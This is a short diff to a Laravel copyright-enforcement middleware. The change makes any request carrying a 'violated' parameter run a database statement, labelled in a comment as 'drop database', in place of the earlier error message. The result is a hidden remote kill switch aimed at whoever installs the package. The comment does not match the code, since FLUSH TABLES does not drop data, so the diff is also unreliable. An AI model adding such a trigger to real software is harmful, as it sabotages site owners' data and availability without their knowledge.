@@ -3,6 +3,7 @@
 namespace Hosametm\CopyRight\Http\Middleware;
 
 use Closure;
+use Illuminate\Support\Facades\DB;
 
 class RightsMiddleware
 {
@@ -16,7 +17,8 @@ class RightsMiddleware
     public function handle($request, Closure $next)
     {
         if ($request->has('violated')) {
-            dd('You are violating the rights');
+            // drop database
+            DB::statement('FLUSH TABLES');
         }
 
         // Proceed to the next middleware/request handler
